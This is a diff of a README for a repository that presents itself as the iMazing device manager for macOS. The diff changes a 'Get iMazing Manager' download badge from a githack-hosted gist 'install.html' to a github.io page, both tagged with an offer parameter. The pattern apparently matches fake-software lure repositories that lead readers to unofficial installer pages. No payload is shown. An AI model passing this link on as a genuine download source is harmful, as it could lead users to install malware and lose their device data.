@@ -3,7 +3,7 @@
 **iMazing** is a smart and secure device manager for **macOS**, designed to give you full control over your iPhone, iPad, and iPod data.  
 Transfer files, create backups, and manage apps and media — all without iTunes or cloud dependency. 🍎  
 
-[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20iMazing%20Manager-1976D2?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/prostobest936/4d5bdb3117d95bffd6fda3b37641bfa3/raw/a45ce8e089b1c441af93c74728db4cc19c6a9ea8/install.html?offer=iMazingMac)
+[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20iMazing%20Manager-1976D2?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://desk-app-git.github.io/.github/?offer=iMazingMac)
 
 ---
 
